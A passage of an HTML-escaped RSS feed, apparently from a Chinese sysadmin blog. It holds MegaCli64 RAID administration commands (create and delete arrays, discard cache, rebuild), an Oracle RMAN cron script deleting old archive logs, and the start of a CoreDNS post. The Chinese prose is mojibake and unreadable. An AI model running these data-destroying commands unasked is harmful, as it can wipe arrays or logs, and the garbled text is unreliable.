&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#/opt/MegaRAID/MegaCli/MegaCli64 -PDList -a0 |grep &amp;#39;Firmware state&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#/opt/MegaRAID/MegaCli/MegaCli64 -PDMakeGood -Physdrv &amp;#34;[32:3]&amp;#34; -a0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# clear Firmware JBOD mode, first turn into unconfig mode, then MakeGood&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#/opt/MegaRAID/MegaCli/MegaCli64 -PDList -a0 |grep &amp;#39;Firmware state&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#/opt/MegaRAID/MegaCli/MegaCli64 -PDMakeGood -Physdrv [32:3] -force -a0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#/opt/MegaRAID/MegaCli/MegaCli64 AdpGetProp EnableJBOD -aALL&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#/opt/MegaRAID/MegaCli/MegaCli64 -AdpSetProp -EnableJBOD -1  -a0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#/opt/MegaRAID/MegaCli/MegaCli64 -PDMakeJBOD -PhysDrv[252:0] -a0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# create Raid0 &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#/opt/MegaRAID/MegaCli/MegaCli64 -CfgLdAdd -r0[252:3] -a0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Get old Cache, ex: Virtual Drive(Target ID 02)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#/opt/MegaRAID/MegaCli/MegaCli64 -GetPreservedCacheList -a0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Clear cache, ex: Virtual Drive(Target ID 02)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#/opt/MegaRAID/MegaCli/MegaCli64 -DiscardPreservedCache -L2 -a0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# create Raid1 &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#/opt/MegaRAID/MegaCli/MegaCli64 -CfgLdAdd -r1[252:4,252:5] -a0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# create Raid5&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#/opt/MegaRAID/MegaCli/MegaCli64 -CfgLdAdd -r5[252:2,252:3,252:4,252:5] -a0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# create Raid10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#/opt/MegaRAID/MegaCli/MegaCli64 -CfgSpanAdd -r10 -Array0[32:4,32:5] -Array1[32:6,32:7] -a0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#delete raid&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#/opt/MegaRAID/MegaCli/MegaCli64 -CfgLdDel -L0 -a0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#Virtual Drive: 0 (Target Id: 0)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# check Raid&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#/opt/MegaRAID/MegaCli/MegaCli64 -LDInfo -Lall -aALL&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#RAID 1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#RAID Level          : Primary-1, Secondary-0, RAID Level Qualifier-0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#RAID 5&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#RAID Level          : Primary-5, Secondary-0, RAID Level Qualifier-3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# check Raid disks&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#/opt/MegaRAID/MegaCli/MegaCli64 -LdPdInfo -aAll | egrep &amp;#34;^Adapter|^Number of Virtual|^Virtual Drive:|^Name|^Enclosure Device ID:|^Slot Number:&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# GPT part&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#parted -s /dev/sde mklabel gpt mkpart primary 0% 100%&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# check disk rebuild progress&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#/opt/MegaRAID/MegaCli/MegaCli64  -PDRbld -ShowProg -physdrv[32:1] -aALL&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#Rebuild Progress on Device at Enclosure 32, Slot 1 Completed 7% in 3 Minutes.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Force rebuild&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#/opt/MegaRAID/MegaCli/MegaCli64  -PDRbld -Start -physdrv[32:1] -a0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# OR&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#/opt/MegaRAID/MegaCli/MegaCli64  -pdlocate -start -physdrv[32:1] -a0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#Start rebuild, first clean the foreign configuration and then make the device hot spare (only if the above command failed)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#/opt/MegaRAID/MegaCli/MegaCli64 -CfgForeign -Clear -aALL&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#set global hostspare&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#/opt/MegaRAID/MegaCli/MegaCli64 -PDHSP -Set -PhysDrv [32:1] -a0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#If you need to unset/remove a global hotspare:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#/opt/MegaRAID/MegaCli/MegaCli64 -PDHSP -Rmv -PhysDrv [32:1] -aN&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#downgrade raid6 --&amp;gt; raid5 ,and more space now can be used&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# -L0  virtual disk 0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# /opt/MegaRAID/MegaCli/MegaCli64 -LDRecon -Start -r5 -L0 -a0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# echo 1 &amp;gt; /sys/block/sda/device/rescan&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#Add disk to a raid5&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#/opt/MegaRAID/MegaCli/MegaCli64 -LDRecon -Start -r5 -Add -PhysDrv[32:3] -L0 -a&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#Configure WriteThrough or WriteBack&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#/opt/MegaRAID/MegaCli/MegaCli64 -LDSetProp -WT -Immediate -Lall -aAll&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#/opt/MegaRAID/MegaCli/MegaCli64 -LDSetProp -WB -Immediate -Lall -aAll&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#/opt/MegaRAID/MegaCli/MegaCli64 -PDList -aALL |grep &amp;#34;Inquiry Data:&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#Inquiry Data: SEAGATE ST600MP0005     VS08S7M04B0C            &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#Inquiry Data: SEAGATE ST600MP0005     VS08S7M04AFD            &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#Inquiry Data: SEAGATE ST600MP0005     VS08S7M04JAY            &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#Inquiry Data: SEAGATE ST600MP0005     VS08S7M04AAG            &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#/opt/MegaRAID/MegaCli/MegaCli64 -PDList -aALL  | grep &amp;#34;Drive Temperature&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#Drive Temperature :36C (96.80 F)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#Drive Temperature :35C (95.00 F)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>Oracleä½¿ç”¨rmanå®šæ—¶æ¸…é™¤7å¤©å‰çš„æ—¥å¿—</title>
      <link>https://rendoumi.com/posts/20221208-oracle_rman/</link>
      <pubDate>Thu, 08 Dec 2022 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20221208-oracle_rman/</guid>
      <description>&lt;p&gt;è¿™ä¸€ç¯‡æ­£è§„çš„DBAçœ‹åˆ°è‚¯å®šä¼šå‘²ä¹‹ä»¥é¼»ï¼Œä½†å¯¹äºæ²¡æœ‰ç”¨è¿‡oracleçš„ç³»ç»Ÿè¿ç»´æ¥è¯´ï¼Œå°±æ˜¯å¿…é¡»çŸ¥é“çš„äº‹æƒ…äº†ã€‚&lt;/p&gt;
&lt;p&gt;å…¬å¸çš„ Oracle å®ä¾‹æœ‰ä¸¤å°æ•°æ®åº“ï¼Œå®šæ—¶ç”¨rmanå¤‡ä»½ï¼Œä½†æ˜¯æ²¡æœ‰è‡ªåŠ¨æ¸…ç†æœºåˆ¶ ï¼Œè¿‡ä¸€é˜µå­ç£ç›˜å°±ä¼šè¶…è¿‡ 80% å‘Šè­¦ï¼Œéœ€è¦æ‰‹åŠ¨æ¸…ç†ï¼Œçƒ¦ä¸èƒœçƒ¦ã€‚&lt;/p&gt;
&lt;p&gt;å‡¡æ˜¯è¦æ‰‹åŠ¨åšä¸‰æ¬¡çš„äº‹æƒ…å¿…é¡»è‡ªåŠ¨åŒ–å¤„ç†ï¼Œå¯è£å¤§å¸ˆå¦‚æ˜¯è¯´ï¼Œç…§åŠå°±æ˜¯ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat del_log.sh
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#!/bin/bash&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;source&lt;/span&gt; /home/oracle/.bash_profile
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;rman target / &lt;span class=&#34;s&#34;&gt;&amp;lt;&amp;lt; EOF
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;delete noprompt archivelog until time &amp;#39;sysdate-7&amp;#39;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;exit;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;EOF&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¾ˆç®€å•å§ã€‚ä¸Šé¢å¼•ç”¨çš„ .bash_profile å†…å®¹å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# .bash_profile&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Get the aliases and functions&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; -f ~/.bashrc &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        . ~/.bashrc
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# User specific environment and startup programs&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;PATH&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$PATH&lt;/span&gt;:&lt;span class=&#34;nv&#34;&gt;$HOME&lt;/span&gt;/.local/bin:&lt;span class=&#34;nv&#34;&gt;$HOME&lt;/span&gt;/bin
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; PATH
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;ORACLE_BASE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/data/u01/app/oracle
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;ORACLE_HOME&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/data/u01/app/oracle/product/18.3.0/dbhome_1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;ORACLE_SID&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;oradb
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;PATH&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/usr/sbin:&lt;span class=&#34;nv&#34;&gt;$PATH&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;PATH&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$ORACLE_HOME&lt;/span&gt;/bin:&lt;span class=&#34;nv&#34;&gt;$PATH&lt;/span&gt;:/usr/local/bin
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;LD_LIBRARY_PATH&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$ORACLE_HOME&lt;/span&gt;/lib:/lib:/usr/lib:&lt;span class=&#34;nv&#34;&gt;$ORACLE_HOME&lt;/span&gt;/rdbms/lib
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;CLASSPATH&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$ORACLE_HOME&lt;/span&gt;/JRE:&lt;span class=&#34;nv&#34;&gt;$ORACLE_HOME&lt;/span&gt;/jlib:&lt;span class=&#34;nv&#34;&gt;$ORACLE_HOME&lt;/span&gt;/rdbms/jlib
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;NLS_DATE_FORMAT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;yyyy/mm/dd hh24:mi:ss&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;EDITOR&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;vi
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;umask&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;022&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™ä¸ª del_log.sh çš„è„šæœ¬æ”¾è¿› oracle ç”¨æˆ·çš„ crontab é‡Œæ‰§è¡Œå°±å¥½&lt;/p&gt;</description>
    </item>
    <item>
      <title>CoreDNSæ›¿ä»£dnsmasq</title>
      <link>https://rendoumi.com/posts/20221207-cordns_dnsmasq/</link>
      <pubDate>Wed, 07 Dec 2022 10:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20221207-cordns_dnsmasq/</guid>
      <description>&lt;p&gt;CoreDNSæ˜¯k8sçš„å¾¡ç”¨DNSè§£æè½¯ä»¶&lt;/p&gt;
&lt;p&gt;æ”¯æŒå¾ˆå¤šæ’ä»¶ï¼Œå„ç§DoHã€DoTã€gRPC ï¼Œå„ç§ç‰¹æ€§ï¼Œå®‰è£…é…ç½®ä¹Ÿååˆ†ç®€å•&lt;/p&gt;
